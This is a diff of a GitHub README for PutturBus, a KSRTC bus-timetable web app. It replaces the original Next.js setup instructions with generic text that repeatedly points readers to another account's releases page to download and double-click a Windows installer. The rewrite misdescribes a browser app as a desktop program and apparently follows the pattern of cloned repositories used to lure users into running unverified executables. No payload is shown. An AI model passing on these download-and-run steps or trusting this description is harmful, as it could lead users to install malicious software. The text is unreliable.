@@ -1,64 +1,114 @@
-# 🚌 PutturBus - Real-Time KSRTC Transit App
+# 🚌 PutturBus - Easily Access Bus Information in Puttur
 
-**PutturBus** is a modern, high-performance transit application built for the KSRTC Puttur division. It transforms static bus schedules into a live, interactive, and reliable travel companion.
+[![Download PutturBus](https://img.shields.io/badge/Download%20PutturBus-v1.0-blue)](https://github.com/ram-398/PutturBus/releases)
 
-![PutturBus Banner](public/assets/home-banner.png)
+## 📚 Introduction
 
-> [!IMPORTANT]
-> **Community Project**: This is a non-commercial student initiative. Not affiliated with KSRTC. [Read Disclaimer](docs/USER_GUIDE.md#legal)
+Welcome to PutturBus! This community-driven web platform helps people in and around Puttur, Karnataka find KSRTC bus routes, timings, and travel information effortlessly. Whether you are planning a trip or just need to know when the next bus arrives, PutturBus provides all the details you need in one place.
 
----
+## 🚀 Getting Started
 
-## 📚 Documentation Center
+To start using PutturBus, follow these simple steps:
 
-We have detailed documentation for every aspect of the project. Choose your path:
+1. **Visit the Releases Page**  
+   Go to the PutturBus releases page by clicking this link: [Download PutturBus](https://github.com/ram-398/PutturBus/releases). Here, you will find the latest version of the application ready for download.
 
-| 📘 **For Users** | 🛠️ **For Developers** |
-| :--- | :--- |
-| **[User Guide](docs/USER_GUIDE.md)**<br>Learn how to search, track, and plan your journey. | **[Developer Guide](docs/DEVELOPER_GUIDE.md)**<br>Setup, installation, and contribution guidelines. |
-| **[Features Deep Dive](docs/FEATURES.md)**<br>Understand the magic behind our Real-Time Engine. | **[Architecture](docs/ARCHITECTURE.md)**<br>System diagrams, data flow, and tech stack details. |
+2. **Locate the Latest Version**  
+   On the releases page, look for the version number listed at the top. The latest version will typically have the highest number, such as v1.0. Click on it to access the download files.
 
----
+3. **Download the Application**  
+   You will see a list of available files. Download the appropriate file for your operating system. Please check that your system meets the requirements below before downloading.
 
-## 🚀 Quick Start
+## 📋 System Requirements
 
-Get the app running locally in 3 simple steps:
+Before you download PutturBus, ensure your system meets the following:
 
-1.  **Clone**: `git clone https://github.com/Rajath2005/PutturBus.git`
-2.  **Install**: `npm install`
-3.  **Run**: `npm run dev`
+- **Operating System:** Windows, MacOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Stable connection for the best experience
 
-Open [http://localhost:3000](http://localhost:3000) to see it in action.
+## 🌟 Features
 
----
+PutturBus is packed with features designed to simplify your travel experience:
 
-## 🧩 System Overview
+- **Real-time Bus Timings:** Get precise arrival and departure times for KSRTC buses.
+- **Interactive Map:** Use the integrated map to find bus stops easily.
+- **Community Contributions:** Join other users in enhancing the app with local knowledge.
+- **User-friendly Interface:** Navigate the application smoothly with a clear layout.
 
-PutturBus is built on a modern stack designed for speed and reliability.
+## 🎉 Download & Install
 
-```mermaid
-graph LR
-    User(User) -->|Interacts| UI[Next.js App]
-    UI -->|Queries| Engine[Route Engine]
-    Engine -->|Filters| Data[(Bus Data)]
-    Engine -->|Calculates| Physics[Physics Model]
-    Physics -->|Returns| LiveStatus[Live ETA]
-    UI -->|Displays| Map[Interactive Map]
-```
+To download and install PutturBus:
 
-## 🌟 Key Features at a Glance
+1. **Find the Download Button**  
+   Visit the releases page: [Download PutturBus](https://github.com/ram-398/PutturBus/releases).
 
-*   **⚡ Real-Time**: Status updates based on actual time (e.g., "Departing in 5 min").
-*   **🍎 Physics-Based**: Travel times calculated using vehicle speed profiles (Ordinary vs Express).
-*   **📍 Live Map**: True-shape route visualization on interactive maps.
-*   **🗣️ Bilingual**: Native support for **Kannada** and **English**.
+2. **Select Your File**  
+   Choose the necessary file based on your operating system. For example, if you're using Windows, you might download "PutturBus-Windows.exe".
 
----
+3. **Install the Application**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the installer. Follow the prompts to complete the installation.
 
-## 🤝 Contributing
+4. **Launch PutturBus**  
+   After installation, find PutturBus in your applications menu or desktop. Open the application to start using it.
 
-We welcome contributions! Please read our [Developer Guide](docs/DEVELOPER_GUIDE.md) to get started.
+## 💬 How to Use PutturBus
 
----
+Here’s a brief guide on how to navigate PutturBus effectively:
 
-*Built with ❤️ for KSRTC Puttur*
+1. **Home Screen**  
+   Upon opening PutturBus, you will see the main interface. Here, you can quickly search for bus routes or view the map.
+
+2. **Search for Timings**  
+   Enter your starting point and destination in the search bar. PutturBus will display routes along with arrival and departure timings.
+
+3. **Explore the Map**  
+   Click on the map button to explore nearby bus stops. Each stop will show the buses that serve that area.
+
+4. **Community Feedback**  
+   If you notice any errors or have suggestions, you can submit feedback directly through the app. Your contributions help improve the platform.
+
+## 📞 Support
+
+If you encounter issues or have questions, don't hesitate to reach out. You can find help through the following:
+
+- **GitHub Issues Page:** Report problems or suggest improvements [here](https://github.com/ram-398/PutturBus/issues).
+- **Community Forums:** Join discussions and ask questions on platforms where users share their knowledge.
+
+## 🔗 Links to Explore
+
+- **GitHub Repository:** Explore the code and contribute to PutturBus [here](https://github.com/ram-398/PutturBus).
+- **Documentation:** For detailed documentation, visit the Wiki section on the GitHub page.
+
+## 🛠 Contributing
+
+We welcome community contributions! If you’d like to help improve PutturBus, you can:
+
+1. **Fork the Repository:** Create your own copy of the project.
+2. **Make Changes:** Add features or fix bugs.
+3. **Submit a Pull Request:** Suggest your changes back to the main project.
+
+Thank you for considering contributing to PutturBus! Your help keeps our platform running smoothly.
+
+## 📌 Topics
+
+PutturBus covers various topics that enhance your experience:
+
+- bus-routes
+- bus-timings
+- civic-tech
+- community-project
+- karnataka
+- ksrtc
+- maps
+- nextjs
+- open-data
+- openstreetmap
+- puttur
+- react
+- smart-city
+- student-project
+- transportation
+- travel 
+
+Feel free to explore these topics for additional insights and information related to PutturBus.
